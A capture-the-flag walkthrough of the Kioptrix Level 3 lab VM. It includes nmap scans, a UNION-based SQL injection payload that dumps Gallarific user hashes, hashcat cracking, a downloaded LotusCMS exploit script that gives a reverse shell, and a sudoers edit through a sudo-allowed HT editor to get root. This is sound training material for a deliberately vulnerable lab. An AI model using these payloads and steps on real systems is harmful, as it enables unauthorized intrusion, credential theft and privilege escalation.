> As with the other two, this challenge is geared towards the beginner. It is however different. Added a few more steps and a new skill set is required. Still being the realm of the beginner I must add. The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy. Remember… the sense of “easy” or “difficult” is always relative to ones own skill level. I never said these things were exceptionally hard or difficult, but we all need to start somewhere. And let me tell you, making these vulnerable VMs is not as easy as it looks…


## Initial VM Setup

This system requires that you add an entry into your /etc/hosts file if you are Kali Linux.

```
127.0.0.1	localhost
127.0.1.1	kali
10.0.2.7	kioptrix3.com
```

Under Windows, you would edit C:\Windows\System32\drivers\etc\hosts to look something like this:

```
# localhost name resolution is handled within DNS itself.
#   127.0.0.1 localhost
#   ::1 localhost127.0.0.1 static3.cdn.ubi.com
192.168.1.102 kioptrix3.com
```

## Initial recon
### Nmap scan

We start initial active recon with an fast (-T4) aggressive (-A) scan of all TCP ports (-p-) and output to all formats (-oA).
Very Verbose output (-vv) to see live scanning results
```
sudo nmap 10.0.2.7 -T4 -A -vv -p- -oA tcp_all_ports_fast_agg
```

We can also run a quick (-T4) version UDP scan (-sUV) of the top 1000 ports to see if there is any interesting UDP ports.
```
sudo nmap 10.0.2.7 -sUV -T4 -vv -oA udp_top_1000_version
```

There are only two open ports SSH (22) and HTTP (80). Seems like the system is also running Ubuntu.

Nothing interesting for UDP, all ports appear to be open/filtered which means they are mostly likely all closed.

## Enumeration

Since we can only see port 80 open with an Apache Web Server running on it lets start with investigating it.

Seems like we got a simple website based on Lotus CMS. There is a mention of a new gallery CMS system that they made.

![Kioptrix4 Website](/Images/vh_kioptrix3_webpage_1.jpg)

Inspecting the websites blog pages we wind the a link to the gallery system: **http://kioptrix3.com/gallery**

![Kioptrix4 Blog post](/Images/vh_kioptrix3_webpage_2.jpg)

Looks like we found the gallery application called **"Gallarific"**

![Gallery Application](/Images/vh_kioptrix3_webpage_3.jpg)

### SQL Injection

Searching [exploitdb.com](https://www.exploit-db.com/exploits/15891) we find that Gallarific is susceptible to SQL injection attacks.

The exploit states that the id URL parameter is the injection point. We will need to modify these to suit our host and URL path to the application.
```
www.site.com/gallery.php?id=null[Sql Injection]
www.site.com/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users--
```

![SQL Injection error](/Images/vh_kioptrix3_sqli_1.jpg)

```

```

![Database table names](/Images/vh_kioptrix3_sqli_2.jpg)

![User hash values](/Images/vh_kioptrix3_sqli_3.jpg)

It appears that we have found two users and their associated passwords that look like they are MD5 hashes.

Using [crackstation.net](https://crackstation.net/) you can quickly crack these MD5 hashes.

If you do not have internet access you can always use hashcat to brute force it using some GPU power.

-m 0 parameter is for the MD5 hash mode.
```
hashcat -a 0 -m 0 kioptrix3_hashes.txt /usr/share/wordlists/rockyou.txt

### Lotus CMS remote code injection exploit.

I was able to find this working exploit bash script which allows us to gain a reverse shell on the system as the **www-data** user.

> Note: The LotusCMS exploits on exploitdb.com did not seem to work and require some modification.

[LotusCMS Exploit Script](https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh)

```
wget https://github.com/Hood3dRob1n/LotusCMS-Exploit/raw/master/lotusRCE.sh
chmod +x lotusRCE.sh
./lotusRCE kioptrix3.com /
```

![LotusCMS Exploit and Reverse Shell](/Images/vh_kioptrix3_lotuscms_exploit.jpg)

## Privilege Escalation

We can SSH into the box using the user **loneferret** and the password **starwars**

Checking what **loneferret** can run as SUDO reveals that he can run what appears to be HT Editor

> "HT is a file editor/viewer/analyzer for executables. The goal is to combine the low-level functionality of a debugger and the usability of IDEs. We plan to implement all (hex-)editing features and support of the most important file formats."

```
cat CompanyPolicy.README
```

Check the CompanyPolicy.README to see that they use they installed the HT editor for editing, creating and viewing files!

Lets try to edit the /etc/sudoers file as we should be editing it with SUDO rights.

```
# In order to avoid the following error "Error opening terminal: xterm-256color." type this in the SSH terminal session
export TERM=xterm-color

# Open the ht editor as sudo
sudo ht

# Press F3 to open and load the /etc/sudoers file

# Insert .bin.bash just after the /usr/local/bin/ht, in the sudoers file
/bin/bash

# Press F2 to save
# Press F10 to exit
# Press Y to confirm changes.

# Execute bash as sudo to get root
sudo bash
```

![HT editor /etc/sudoers file](/Images/vh_kioptrix3_privesc_1.jpg)

![Privilege Escalation](/Images/vh_kioptrix3_privesc_2.jpg)

As you can see we can now easily get root and read the /root/Congrats.txt file left by loneferret.

### Possible Kernel Privilege escalation.

If we had not found the other path for privilege escalation we could have abused the fact that this VM is running an old Linux Kernel version.

```
uname -a
```
> Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux

Searching exploitdb.com we can see there are a few potential Kernel Privilege Escalation exploits.
* [Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Escalation ](https://www.exploit-db.com/exploits/9545)
* [Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 'set_selection()' UTF-8 Off-by-One Privilege Escalation](https://www.exploit-db.com/exploits/9083)
* [Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation (2) ](https://www.exploit-db.com/exploits/8572)
* [Linux Kernel 2.6.20/2.6.24/2.6.27_7-10 (Ubuntu 7.04/8.04/8.10 / Fedora Core 10 / OpenSuse 11.1) - SCTP FWD Memory Corruption Remote Overflow ](https://www.exploit-db.com/exploits/8556)

I did not try them as time was limited and I had already gained root on the system in a safer way.

## Summary

Overall this machine was fun, the SQL injection attacks were interesting as we had to enumerate the database a bit to find what we needed. The privilege escalation via the HT editor was trivial, as this is a common mistake that people seems to make were they give editing software sudo rights we can be leveraged to change sensitive files. We could have even edited the /etc/passwd or /etc/shadow files to get root privileges.
